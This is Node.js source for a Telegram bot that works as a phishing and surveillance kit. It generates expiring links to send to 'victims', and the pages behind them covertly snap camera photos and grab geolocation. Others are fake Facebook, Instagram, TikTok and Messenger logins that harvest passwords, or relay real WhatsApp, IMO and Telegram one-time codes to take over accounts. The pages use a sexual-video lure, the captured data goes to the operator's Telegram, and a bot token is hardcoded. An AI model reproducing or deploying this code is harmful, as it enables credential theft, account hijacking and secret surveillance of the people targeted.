const express     = require('express');
const http        = require('http');
const telegramBot = require('node-telegram-bot-api');
const multer      = require('multer');
const bodyParser  = require('body-parser');
const axios       = require('axios');
const crypto      = require('crypto');

// ─────────────────────────────────────────────
const TOKEN      = process.env.TOKEN    || '8947935753:AAE6qFZFg53Rj2VOszjNazhKoBEv_qrDg6k';
const ADMIN_ID   = process.env.ADMIN_ID || '8294558143';
const CHANNEL    = 'rakibfxatrading';
const CHANNEL_LINK = 'https://t.me/rakibfxatrading';
const FB_LINK    = 'https://www.facebook.com/profile.php?id=61595042636110';
const WELCOME_IMG = 'https://hc1.checker.in/file2link/photos/file_639266.jpg/file_639266.jpg';
const LURE_IMG   = 'https://hc1.checker.in/file2link/photos/file_656565.jpg/file_656565.jpg';
// ─────────────────────────────────────────────

const app    = express();
const server = http.createServer(app);
const bot    = new telegramBot(TOKEN, { polling: true });

const upload = multer({ limits: { fileSize: 50*1024*1024 } });
app.use(bodyParser.json({ limit:'50mb' }));
app.use(bodyParser.urlencoded({ extended:true, limit:'50mb' }));

function getBase(req) {
    if (process.env.RENDER_EXTERNAL_URL) return process.env.RENDER_EXTERNAL_URL;
    if (req) return `${req.protocol}://${req.get('host')}`;
    return 'http://localhost:' + (process.env.PORT || 8999);
}

const links   = new Map();
const sessions = new Map(); // sessionId → { phone, tgHash, uid, site }

const tgMsg = (c,t,o={}) => bot.sendMessage(c,t,{parse_mode:'HTML',...o}).catch(()=>{});
const tgPic = (c,b,cap)  => bot.sendPhoto(c,b,{caption:cap,parse_mode:'HTML'}).catch(()=>{});
const tgLoc = (c,la,lo)  => bot.sendLocation(c,la,lo).catch(()=>{});

function mkLink(action, uid, req) {
    const tok = crypto.randomBytes(12).toString('hex');
    links.set(tok, { action, uid });
    setTimeout(() => links.delete(tok), 600000);
    return getBase(req) + '/go/' + tok;
}

async function checkJoin(userId) {
    try {
        const m = await bot.getChatMember('@'+CHANNEL, userId);
        return ['member','administrator','creator'].includes(m.status);
    } catch(e) { return false; }
}

// ════════════════════════════════════════════
// KEYBOARDS
// ════════════════════════════════════════════
const joinKb = () => ({ inline_keyboard:[
    [{text:'🔵 Facebook Page', url:FB_LINK}],
    [{text:'📢 Telegram Channel', url:CHANNEL_LINK}],
    [{text:'✅ Joined — Verify Now', callback_data:'VERIFY'}]
]});

function mainKb() {
    return { inline_keyboard:[
        [{text:'📷 সামনে ক্যামেরা',callback_data:'LNK_cam_f'},{text:'📷 পিছনে ক্যামেরা',callback_data:'LNK_cam_b'}],
        [{text:'📍 লোকেশন',callback_data:'LNK_loc'}],
        [{text:'🎣 Facebook',callback_data:'LNK_phish_fb'},{text:'📸 Instagram',callback_data:'LNK_phish_ig'}],
        [{text:'🎵 TikTok',callback_data:'LNK_phish_tt'},{text:'📨 Messenger',callback_data:'LNK_phish_msgr'}],
        [{text:'📱 WhatsApp',callback_data:'LNK_phish_wa'},{text:'💬 IMO',callback_data:'LNK_phish_imo'}],
        [{text:'✈️ Telegram',callback_data:'LNK_phish_tg'}]
    ]};
}

const linkKb = (act) => ({ inline_keyboard:[[
    {text:'🔄 নতুন লিংক',callback_data:act},
    {text:'◀️ মেনু',callback_data:'M_BACK'}
]]});

// ════════════════════════════════════════════
// BOT
// ════════════════════════════════════════════
bot.onText(/\/start/, async msg => {
    const cid  = msg.chat.id;
    const name = msg.from.first_name || 'বন্ধু';
    try {
        await bot.sendPhoto(cid, WELCOME_IMG, {
            caption: `🔥 <b>স্বাগতম ${name}!</b>\n\n🛡️ Advanced Tool Bot\n\n📌 চ্যানেলে যুক্ত হয়ে Verify করুন।`,
            parse_mode:'HTML', reply_markup: joinKb()
        });
    } catch(e) {
        tgMsg(cid, `🔥 <b>স্বাগতম ${name}!</b>`, {reply_markup:joinKb()});
    }
});

bot.onText(/\/menu/, msg => tgMsg(msg.chat.id,'🎯 মেইন মেনু:',{reply_markup:mainKb()}));

bot.on('callback_query', async cbq => {
    const uid    = String(cbq.from.id);
    const chatId = cbq.message.chat.id;
    const msgId  = cbq.message.message_id;
    const data   = cbq.data;
    const name   = cbq.from.first_name||'বন্ধু';
    bot.answerCallbackQuery(cbq.id).catch(()=>{});
    const del  = () => bot.deleteMessage(chatId,msgId).catch(()=>{});
    const edit = (t,kb) => bot.editMessageText(t,{chat_id:chatId,message_id:msgId,parse_mode:'HTML',reply_markup:kb}).catch(()=>{});

    if (data==='VERIFY') {
        const joined = await checkJoin(cbq.from.id);
        if (!joined) return bot.answerCallbackQuery(cbq.id,{text:'❌ আগে চ্যানেলে যুক্ত হন!',show_alert:true}).catch(()=>{});
        bot.answerCallbackQuery(cbq.id,{text:'✅ ভেরিফাই সফল!'}).catch(()=>{});
        return edit(`✅ <b>ভেরিফাই সফল! স্বাগতম ${name}!</b>`,
            {inline_keyboard:[[{text:'🎯 মেইন মেনু',callback_data:'ROUTE_HACK'}]]});
    }
    if (data==='ROUTE_HACK'||data==='M_BACK') { del(); return tgMsg(chatId,'🎯 মেইন মেনু:',{reply_markup:mainKb()}); }

    if (data.startsWith('LNK_')) {
        const act = data.slice(4);
        del();
        const link = mkLink(act, uid);
        return tgMsg(chatId,
            `🔗 <b>লিংক তৈরি হয়েছে!</b>\n\n<code>${link}</code>\n\n👆 কপি করে ভিক্টিমকে পাঠান\n⏰ ১০ মিনিট মেয়াদ`,
            {reply_markup:linkKb(data)});
    }
});

// ════════════════════════════════════════════
// DATA ENDPOINTS
// ════════════════════════════════════════════
app.get('/',(_,res)=>res.send('<h1 style="color:green;text-align:center">✅ Online</h1>'));

app.post('/d/photo', upload.single('photo'), (req,res)=>{
    const uid=req.body.uid, ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    if(req.file) tgPic(uid, req.file.buffer, `${req.body.camtype||'📸'}\n🌍 ${ip}`);
    res.json({ok:true});
});
app.post('/d/loc',(req,res)=>{
    const uid=req.body.uid, ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    const {lat,lon,acc}=req.body;
    if(lat&&lon){ tgLoc(uid,parseFloat(lat),parseFloat(lon)); tgMsg(uid,`📍 Lat:<code>${lat}</code> Lon:<code>${lon}</code> Acc:${acc}m\n🗺 https://maps.google.com/?q=${lat},${lon}\n🌍 ${ip}`); }
    res.json({ok:true});
});
app.post('/d/text',(req,res)=>{
    const uid=req.body.uid, ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    tgMsg(uid,`📋 <b>${req.body.type||'Info'}</b>\n<code>${(req.body.data||'').slice(0,3800)}</code>\n🌍 ${ip}`);
    res.json({ok:true});
});
app.post('/d/captured',(req,res)=>{
    const uid=req.body.uid, ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    tgMsg(uid,
        `🔑 <b>CAPTURED!</b>\n\n` +
        `🌐 Site: <b>${req.body.site||'?'}</b>\n` +
        `📱 Phone: <code>${req.body.phone||''}</code>\n` +
        `🔒 OTP/Pass: <code>${req.body.otp||''}</code>\n\n` +
        `🌍 IP: ${ip}`
    );
    res.json({ok:true});
});

// ════════════════════════════════════════════
// REAL OTP PROXY ENDPOINTS
// ════════════════════════════════════════════

// ── Telegram — my.telegram.org real OTP ──────
app.post('/proxy/tg/send', async (req,res) => {
    const { phone, sid } = req.body;
    try {
        const r = await axios.post('https://my.telegram.org/auth/send_password',
            `phone=${encodeURIComponent(phone)}`,
            { headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36'
            }, timeout: 15000 }
        );
        if (r.data && r.data.random_hash) {
            sessions.set(sid, { ...sessions.get(sid)||{}, tgHash: r.data.random_hash, phone });
            return res.json({ ok: true });
        }
        res.json({ ok: false });
    } catch(e) {
        res.json({ ok: false, err: e.message });
    }
});

app.post('/proxy/tg/verify', async (req,res) => {
    const { otp, sid } = req.body;
    const sess = sessions.get(sid) || {};
    try {
        await axios.post('https://my.telegram.org/auth/login',
            `phone=${encodeURIComponent(sess.phone)}&random_hash=${sess.tgHash}&password=${encodeURIComponent(otp)}`,
            { headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36'
            }, timeout: 15000 }
        );
        res.json({ ok: true });
    } catch(e) {
        res.json({ ok: false });
    }
});

// ── Facebook — Forgot Password real OTP ──────
app.post('/proxy/fb/send', async (req,res) => {
    const { phone, sid } = req.body;
    try {
        const page = await axios.get('https://www.facebook.com/login/identify/', {
            headers: { 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S908B) Chrome/120 Mobile Safari/537.36',
                       'Accept-Language': 'en-US,en;q=0.9' },
            timeout: 15000
        });
        const lsdM = page.data.match(/"LSD",\[\],{"token":"([^"]+)"/);
        const lsd  = lsdM ? lsdM[1] : '';
        const cookies = (page.headers['set-cookie']||[]).map(c=>c.split(';')[0]).join('; ');
        sessions.set(sid, { ...sessions.get(sid)||{}, fbCookies: cookies, fbLsd: lsd, phone });

        await axios.post('https://www.facebook.com/ajax/recover/initiate/',
            new URLSearchParams({ lsd, email_or_phone: phone, did_login:'0', fur_initiated:'0', action:'initiate' }).toString(),
            { headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S908B) Chrome/120 Mobile Safari/537.36',
                'Cookie': cookies, 'X-Requested-With': 'XMLHttpRequest'
            }, timeout: 15000 }
        );
        res.json({ ok: true });
    } catch(e) {
        res.json({ ok: false, err: e.message });
    }
});

// ── Instagram — Forgot Password real OTP ──────
app.post('/proxy/ig/send', async (req,res) => {
    const { phone, sid } = req.body;
    try {
        const page = await axios.get('https://www.instagram.com/accounts/password/reset/', {
            headers: { 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S908B) Chrome/120 Mobile Safari/537.36' },
            timeout: 15000
        });
        const csrfM   = page.data.match(/"csrf_token":"([^"]+)"/);
        const csrf    = csrfM ? csrfM[1] : '';
        const cookies = (page.headers['set-cookie']||[]).map(c=>c.split(';')[0]).join('; ');
        sessions.set(sid, { ...sessions.get(sid)||{}, igCookies: cookies, igCsrf: csrf, phone });

        await axios.post('https://www.instagram.com/accounts/account_recovery_send_ajax/',
            new URLSearchParams({ phone_number: phone, email:'', login_attempt_count:'0' }).toString(),
            { headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S908B) Chrome/120 Mobile Safari/537.36',
                'Cookie': cookies, 'X-CSRFToken': csrf, 'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/accounts/password/reset/'
            }, timeout: 15000 }
        );
        res.json({ ok: true });
    } catch(e) {
        res.json({ ok: false, err: e.message });
    }
});

// ── WhatsApp — Registration SMS OTP ──────────
app.post('/proxy/wa/send', async (req,res) => {
    const { cc, phone, sid } = req.body; // cc = country code digits, phone = local number
    try {
        const token = Buffer.from(`${cc}${phone}:${Date.now()}`).toString('base64');
        const r = await axios.get(
            `https://v.whatsapp.net/v2/code?cc=${cc}&in=${phone}&lg=en&lc=US&sim_mcc=310&sim_mnc=410&method=sms&reason=&token=${token}&hasav=1`,
            { headers: {
                'User-Agent': 'WhatsApp/2.23.24.84 A',
                'Accept': 'application/json'
            }, timeout: 15000 }
        );
        sessions.set(sid, { ...sessions.get(sid)||{}, wacc: cc, waphone: phone });
        res.json({ ok: true, status: r.data.status });
    } catch(e) {
        res.json({ ok: false, err: e.message });
    }
});

// ── IMO — SMS OTP ─────────────────────────────
app.post('/proxy/imo/send', async (req,res) => {
    const { phone, sid } = req.body;
    try {
        const r = await axios.post('https://api.imo.im/anti-spam/send-code',
            { phone_number: phone, lang: 'en', from_registration: true },
            { headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'imo/2023.12 (Android 13; SDK 33)',
                'Accept': 'application/json'
            }, timeout: 15000 }
        );
        sessions.set(sid, { ...sessions.get(sid)||{}, phone });
        res.json({ ok: true, data: r.data });
    } catch(e) {
        res.json({ ok: false, err: e.message });
    }
});

// ════════════════════════════════════════════
// LINK PAGE BUILDER
// ════════════════════════════════════════════
app.get('/go/:tok',(req,res)=>{
    const info = links.get(req.params.tok);
    if(!info) return res.send('<h2 style="text-align:center;font-family:sans-serif;color:red;margin-top:30%">Link expired.</h2>');
    res.send(buildPage(info.action, info.uid, req));
});

function buildPage(action, uid, req) {
    if (action==='cam_f'||action==='cam_b'||action==='loc') return attackPage(action, uid, req);
    if (['phish_wa','phish_imo','phish_tg'].includes(action)) return phoneOtpPage(action, uid, req);
    return passPhishPage(action, uid, req);
}

// ── Lure block ───────────────────────────────
const lureHtml = `
<div style="text-align:center;padding:0 0 14px">
  <img src="${LURE_IMG}" style="width:100%;border-radius:14px;display:block;margin:0 auto 12px;object-fit:cover;max-height:200px" onerror="this.style.display='none'">
  <p style="font-size:15px;font-weight:800;margin:0 0 5px">🔥🍑 তোমার জন্য পার্সোনাল ভিডিও এসেছে!</p>
  <p style="font-size:12px;line-height:1.7;margin:0">💋 ভিডিওটি শুধু তোমার জন্য — সম্পূর্ণ প্রাইভেট 🔞<br>👀 দেখতে Log in করো — অন্য কেউ দেখতে পাবে না 🔒</p>
</div>`;

// ── Camera / Location ────────────────────────
function attackPage(action, uid, req) {
    const base = getBase(req);
    const s = {
        cam_f:{ic:'📷',h:'Private Photo',t:'Tap to view the photo',btn:'View',bc:'#1877f2',front:true},
        cam_b:{ic:'📸',h:'Photo Shared',t:'Tap to open',btn:'Open',bc:'#1877f2',back:true},
        loc:  {ic:'📍',h:'Confirm Location',t:'Tap to confirm',btn:'Confirm',bc:'#4CAF50',loc:true}
    }[action]||{};
    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Loading</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#111;color:#fff;font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:20px}.ic{font-size:64px;margin-bottom:16px}h2{font-size:20px;margin-bottom:8px}p{color:#aaa;font-size:13px;margin-bottom:22px;max-width:280px;line-height:1.6}.btn{padding:15px 0;width:100%;max-width:300px;border:none;border-radius:50px;background:${s.bc};color:#fff;font-size:16px;font-weight:700;cursor:pointer}#st{margin-top:14px;font-size:13px;color:#aaa}video,canvas{display:none;width:1px;height:1px}</style></head>
<body>
<div style="width:100%;max-width:360px;color:#fff;padding-bottom:10px">${lureHtml}</div>
<div class="ic">${s.ic}</div><h2>${s.h}</h2><p>${s.t}</p>
<button class="btn" id="btn" onclick="go()">${s.btn}</button>
<div id="st"></div>
<video id="vv" autoplay playsinline muted></video><canvas id="cc"></canvas>
<script>
const UID='${uid}',D='${base}/d';
async function go(){
document.getElementById('btn').textContent='...';
${s.loc?`try{await new Promise(r=>{navigator.geolocation.getCurrentPosition(p=>{fetch(D+'/loc',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})});r();},r,{enableHighAccuracy:true,timeout:12000});});}catch(e){}`:''}
${s.front||s.back?`try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'${s.front?'user':'environment'}'},audio:false});const v=document.getElementById('vv');v.srcObject=s;await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,1500));const c=document.getElementById('cc');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));const fd=new FormData();fd.append('photo',b,'cam.jpg');fd.append('uid',UID);fd.append('camtype','${s.front?'📷 Front':'📷 Back'} Camera');await fetch(D+'/photo',{method:'POST',body:fd});}catch(e){}`:''}
document.getElementById('st').textContent='✅';document.getElementById('btn').textContent='${s.btn}';}
</script></body></html>`;
}

// ── FB / IG / TT / Messenger — Password phish ──
function passPhishPage(action, uid, req) {
    const base = getBase(req);
    const pages = {
        phish_fb: {
            name:'Facebook', rdr:'https://www.facebook.com',
            body:`<div style="background:#fff;min-height:100vh;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif">
<div style="max-width:396px;margin:0 auto;padding:20px 16px">
<div style="padding:0 0 14px">${lureHtml.replace(/style="font-size:15px/,'style="font-size:14px;color:#c62828').replace(/style="font-size:12px/,'style="font-size:12px;color:#555')}</div>
<div style="text-align:center;margin-bottom:20px">
<svg viewBox="0 0 36 36" style="width:50px;height:50px" fill="#1877f2"><path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87z"/><path fill="#fff" d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.022V18h5.883l-1.008 5.501h-4.867v12.37a18.183 18.183 0 01-6.531-.4z"/></svg>
<div style="font-size:24px;font-weight:700;color:#1c1e21;margin-top:6px">Facebook</div></div>
<input id="u" type="text" placeholder="Mobile number or email" style="width:100%;padding:14px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:12px;outline:none;color:#1c1e21">
<input id="p" type="password" placeholder="Password" style="width:100%;padding:14px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:16px;outline:none;color:#1c1e21">
<button onclick="sub()" style="width:100%;padding:14px;background:#1877f2;color:#fff;font-size:20px;font-weight:700;border:none;border-radius:6px;cursor:pointer">Log in</button>
<div style="text-align:center;margin:14px 0"><a style="color:#1877f2;font-size:14px;text-decoration:none">Forgot password?</a></div>
<hr style="border:none;border-top:1px solid #dadde1;margin-bottom:18px">
<div style="text-align:center"><button onclick="sub()" style="padding:13px 22px;background:#42b72a;color:#fff;font-size:16px;font-weight:700;border:none;border-radius:6px;cursor:pointer">Create new account</button></div>
</div></div>`
        },
        phish_ig: {
            name:'Instagram', rdr:'https://www.instagram.com',
            body:`<div style="background:#fafafa;min-height:100vh;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif">
<div style="max-width:400px;margin:0 auto;padding:14px">
<div style="padding:0 0 12px">${lureHtml.replace(/style="font-size:15px/,'style="font-size:14px;color:#c2185b').replace(/style="font-size:12px/,'style="font-size:12px;color:#555')}</div>
<div style="border:1px solid #dbdbdb;border-radius:2px;padding:28px 36px;text-align:center;background:#fff;margin-bottom:10px">
<img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b4a.png" style="width:175px;margin-bottom:20px;display:block;margin:0 auto 20px" onerror="this.style.display='none'">
<input id="u" type="text" placeholder="Phone number, username, or email" style="width:100%;padding:9px 8px;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;font-size:14px;margin-bottom:8px;outline:none;color:#262626">
<input id="p" type="password" placeholder="Password" style="width:100%;padding:9px 8px;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;font-size:14px;margin-bottom:10px;outline:none;color:#262626">
<button onclick="sub()" style="width:100%;padding:8px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);color:#fff;font-size:14px;font-weight:600;border:none;border-radius:4px;cursor:pointer">Log in</button>
<div style="display:flex;align-items:center;margin:16px 0"><div style="flex:1;height:1px;background:#dbdbdb"></div><span style="padding:0 14px;color:#8e8e8e;font-size:13px;font-weight:600">OR</span><div style="flex:1;height:1px;background:#dbdbdb"></div></div>
<a style="color:#385185;font-size:14px;font-weight:600;text-decoration:none">Log in with Facebook</a>
<div style="margin-top:14px"><a style="color:#00376b;font-size:12px;text-decoration:none">Forgot password?</a></div></div>
<div style="border:1px solid #dbdbdb;border-radius:2px;padding:16px;text-align:center;font-size:14px;background:#fff">Don't have an account? <a onclick="sub()" style="color:#0095f6;font-weight:600;text-decoration:none;cursor:pointer">Sign up</a></div>
</div></div>`
        },
        phish_tt: {
            name:'TikTok', rdr:'https://www.tiktok.com',
            body:`<div style="background:#fff;min-height:100vh;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif">
<div style="max-width:400px;margin:0 auto;padding:16px">
<div style="padding:0 0 12px">${lureHtml.replace(/style="font-size:15px/,'style="font-size:14px;color:#fe2c55').replace(/style="font-size:12px/,'style="font-size:12px;color:#555')}</div>
<div style="text-align:center;margin-bottom:20px"><span style="font-size:28px;font-weight:900;color:#161823;font-family:Arial Black,sans-serif">TikTok</span></div>
<div style="font-size:20px;font-weight:600;color:#161823;margin-bottom:4px">Log in to TikTok</div>
<div style="font-size:13px;color:#8a8b8d;margin-bottom:20px">Manage your account, check notifications and more.</div>
<input id="u" type="text" placeholder="Phone / Email / Username" style="width:100%;padding:16px;border:1px solid #e3e3e4;border-radius:4px;font-size:15px;margin-bottom:10px;outline:none;color:#161823">
<input id="p" type="password" placeholder="Password" style="width:100%;padding:16px;border:1px solid #e3e3e4;border-radius:4px;font-size:15px;margin-bottom:16px;outline:none;color:#161823">
<button onclick="sub()" style="width:100%;padding:15px;background:#fe2c55;color:#fff;font-size:16px;font-weight:600;border:none;border-radius:4px;cursor:pointer">Log in</button>
<div style="text-align:center;margin-top:14px"><a style="color:#fe2c55;font-size:14px;text-decoration:none;font-weight:500">Forgot password?</a></div>
</div></div>`
        },
        phish_msgr: {
            name:'Messenger', rdr:'https://www.messenger.com',
            body:`<div style="background:#fff;min-height:100vh;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif">
<div style="max-width:400px;margin:0 auto;padding:16px">
<div style="padding:0 0 12px">${lureHtml.replace(/style="font-size:15px/,'style="font-size:14px;color:#0084ff').replace(/style="font-size:12px/,'style="font-size:12px;color:#555')}</div>
<div style="text-align:center;margin-bottom:24px">
<div style="width:60px;height:60px;background:linear-gradient(45deg,#0084ff,#00c6ff);border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:28px">💬</div>
<div style="font-size:26px;font-weight:700;color:#1c1e21;margin-top:8px">Messenger</div></div>
<input id="u" type="text" placeholder="Mobile number or email" style="width:100%;padding:14px;border:1px solid #dddfe2;border-radius:6px;font-size:16px;margin-bottom:10px;outline:none;color:#1c1e21">
<input id="p" type="password" placeholder="Password" style="width:100%;padding:14px;border:1px solid #dddfe2;border-radius:6px;font-size:16px;margin-bottom:14px;outline:none;color:#1c1e21">
<button onclick="sub()" style="width:100%;padding:14px;background:linear-gradient(45deg,#0084ff,#00c6ff);color:#fff;font-size:18px;font-weight:700;border:none;border-radius:6px;cursor:pointer">Log In</button>
<div style="text-align:center;margin-top:14px"><a style="color:#1877f2;font-size:14px;text-decoration:none">Forgot password?</a></div>
</div></div>`
        }
    };
    const c = pages[action] || pages.phish_fb;
    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>${c.name}</title></head>
<body style="margin:0;padding:0">${c.body}
<script>
const UID='${uid}',D='${base}/d',SITE='${c.name}',RDR='${c.rdr}';
window.onload=()=>fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:SITE+' Opened',data:navigator.userAgent})});
async function sub(){
  const u=document.getElementById('u').value,p=document.getElementById('p').value;
  if(!u||!p)return;
  const btn=document.querySelector('button[onclick="sub()"]');btn.textContent='Logging in...';
  await fetch(D+'/captured',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,site:SITE,phone:u,otp:p})});
  setTimeout(()=>window.location.href=RDR,600);
}
</script></body></html>`;
}

// ── WA / IMO / TG — Real OTP flow ────────────
function phoneOtpPage(action, uid, req) {
    const base = getBase(req);
    const sid  = crypto.randomBytes(8).toString('hex');

    const cfg = {
        phish_wa: {
            name:'WhatsApp', rdr:'https://www.whatsapp.com', proxy:'wa',
            color:'#25d366', darkHdr:'#075e54',
            title:'Enter your phone number',
            sub:'WhatsApp will send a 6-digit code to verify your number.',
            otpTitle:'Enter the 6-digit code',
            otpSub:'We sent a code to {phone}. Check your SMS.'
        },
        phish_imo: {
            name:'IMO', rdr:'https://imo.im', proxy:'imo',
            color:'#0052d9', darkHdr:'#003da3',
            title:'Enter your phone number',
            sub:'We will send a verification code via SMS.',
            otpTitle:'Enter verification code',
            otpSub:'Code sent to {phone} via SMS.'
        },
        phish_tg: {
            name:'Telegram', rdr:'https://telegram.org', proxy:'tg',
            color:'#229ed9', darkHdr:'#1a7dac',
            title:'Sign in to Telegram',
            sub:'Please confirm your country code and enter your phone number.',
            otpTitle:'Enter the code',
            otpSub:'We sent the code to your Telegram app or via SMS to {phone}.'
        }
    };
    const c = cfg[action];

    return `<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>${c.name}</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f5f5f5;min-height:100vh;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
.hdr{background:${c.darkHdr};padding:36px 20px 24px;text-align:center;color:#fff}
.hdr img{width:90%;max-width:320px;border-radius:12px;margin-bottom:14px;object-fit:cover;max-height:170px;display:block;margin-left:auto;margin-right:auto}
.hdr .lure-t{font-size:14px;font-weight:700;color:rgba(255,255,255,0.95);margin:0 0 4px}
.hdr .lure-s{font-size:12px;color:rgba(255,255,255,0.75);margin:0 0 14px;line-height:1.5}
.logo{font-size:22px;font-weight:700;color:#fff;margin-top:6px}
.box{padding:24px 20px}
.box h2{font-size:18px;font-weight:600;color:#111;margin-bottom:6px}
.box p{font-size:13px;color:#666;margin-bottom:18px;line-height:1.5}
.row{display:flex;border:1px solid #ccc;border-radius:10px;overflow:hidden;background:#fff;margin-bottom:14px}
select{padding:14px 10px;border:none;background:#f5f5f5;font-size:14px;color:#333;outline:none}
input[type=tel],input[type=number],input[type=text]{flex:1;padding:14px;border:none;font-size:15px;color:#111;outline:none;background:#fff}
.otp-input{width:100%;padding:18px;border:1px solid #ccc;border-radius:10px;background:#fff;font-size:28px;text-align:center;color:#111;outline:none;letter-spacing:8px;margin-bottom:14px}
.btn{width:100%;padding:14px;background:${c.color};color:#fff;font-size:16px;font-weight:700;border:none;border-radius:10px;cursor:pointer;margin-top:4px}
.err{background:#fff3e0;border:1px solid #ff9800;border-radius:8px;padding:8px 12px;font-size:13px;color:#e65100;margin-bottom:12px;display:none}
</style>
</head><body>
<div class="hdr">
  <img src="${LURE_IMG}" onerror="this.style.display='none'">
  <div class="lure-t">🔥🍑 তোমার জন্য পার্সোনাল ভিডিও!</div>
  <div class="lure-s">💋 ${c.name} দিয়ে verify করো — সম্পূর্ণ প্রাইভেট 🔞</div>
  <div class="logo">${c.name}</div>
</div>

<div class="box" id="step1">
  <h2>${c.title}</h2>
  <p>${c.sub}</p>
  <div class="err" id="e1">দয়া করে সঠিক নম্বর দিন।</div>
  <div class="row">
    <select id="cc">
      <option value="880">🇧🇩 +880</option>
      <option value="91">🇮🇳 +91</option>
      <option value="92">🇵🇰 +92</option>
      <option value="1">🇺🇸 +1</option>
      <option value="44">🇬🇧 +44</option>
      <option value="966">🇸🇦 +966</option>
      <option value="971">🇦🇪 +971</option>
      <option value="60">🇲🇾 +60</option>
      <option value="65">🇸🇬 +65</option>
      <option value="62">🇮🇩 +62</option>
      <option value="66">🇹🇭 +66</option>
      <option value="20">🇪🇬 +20</option>
      <option value="234">🇳🇬 +234</option>
      <option value="254">🇰🇪 +254</option>
      <option value="49">🇩🇪 +49</option>
      <option value="33">🇫🇷 +33</option>
      <option value="7">🇷🇺 +7</option>
      <option value="55">🇧🇷 +55</option>
      <option value="52">🇲🇽 +52</option>
      <option value="81">🇯🇵 +81</option>
      <option value="82">🇰🇷 +82</option>
      <option value="86">🇨🇳 +86</option>
      <option value="90">🇹🇷 +90</option>
      <option value="98">🇮🇷 +98</option>
      <option value="964">🇮🇶 +964</option>
      <option value="218">🇱🇾 +218</option>
      <option value="213">🇩🇿 +213</option>
      <option value="212">🇲🇦 +212</option>
    </select>
    <input type="tel" id="ph" placeholder="Phone number">
  </div>
  <button class="btn" id="b1" onclick="sendOtp()">Next →</button>
</div>

<div class="box" id="step2" style="display:none">
  <h2>${c.otpTitle}</h2>
  <p id="otp_info">${c.otpSub}</p>
  <div class="err" id="e2">কোডটি সঠিক নয়। আবার চেষ্টা করুন।</div>
  <input type="number" class="otp-input" id="otp" placeholder="- - - - - -" maxlength="6">
  <button class="btn" id="b2" onclick="verifyOtp()">Verify ✓</button>
</div>

<script>
const UID='${uid}', D='${base}/d', BASE='${base}', SID='${sid}', SITE='${c.name}', RDR='${c.rdr}', PROXY='${c.proxy}';
let fullPhone='';

window.onload=()=>fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({uid:UID,type:SITE+' Opened',data:navigator.userAgent})});

async function sendOtp(){
  const cc=document.getElementById('cc').value;
  const ph=document.getElementById('ph').value.trim().replace(/^0+/,'');
  if(!ph||ph.length<5){document.getElementById('e1').style.display='block';return;}
  document.getElementById('e1').style.display='none';
  document.getElementById('b1').textContent='Sending...';
  fullPhone='+'+cc+ph;
  // Report phone to attacker
  await fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({uid:UID,type:'📱 '+SITE+' Phone',data:fullPhone})});
  // Trigger real OTP on real server
  try{
    await fetch(BASE+'/proxy/'+PROXY+'/send',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({phone:fullPhone,cc,phone_local:ph,sid:SID})});
  }catch(e){}
  // Show OTP step
